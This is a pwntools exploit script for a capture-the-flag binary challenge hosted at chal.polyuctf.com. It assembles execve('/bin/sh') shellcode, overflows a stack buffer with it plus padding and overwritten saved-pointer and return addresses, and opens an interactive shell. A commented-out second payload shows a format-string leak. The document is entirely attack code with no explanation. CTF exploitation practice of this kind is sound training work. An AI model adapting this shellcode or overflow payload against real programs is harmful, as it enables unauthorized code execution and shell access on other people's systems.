from pwn import * 

s = '''
b * vuln+77 
'''

binary = './chal'
elf = ELF(binary)

p = process(binary)
p = remote('chal.polyuctf.com', 32499)
context.arch = 'amd64'
win = 0x40123b
elf_base = elf.bss() + 0x100
gets = 0x00000000004012bc
printf = 0x401288
fopen = 0x0000000000401256
shellcode = asm('''
    xor rax, rax
    xor rsi, rsi
    xor rdx, rdx
    

    push rax              
    mov rdi, 0x68732f6e69622f 
    push rdi
    

    mov rdi, rsp          



    mov al, 0x3b       
    
    syscall
''')

print(len(shellcode))

payload = shellcode
payload += b'A' * (0x40 - len(shellcode))
payload += p64(elf_base + 0x40)
payload += p64(fopen)

#gdb.attach(p, s)
p.sendline(payload)

'''
payload2 = b"%p-%p-%p-%p-%p-%p-"
payload2 += b'A' * (0x48 - len(payload2))
payload2 += p64(printf)
p.sendline(payload2)
'''
p.interactive()
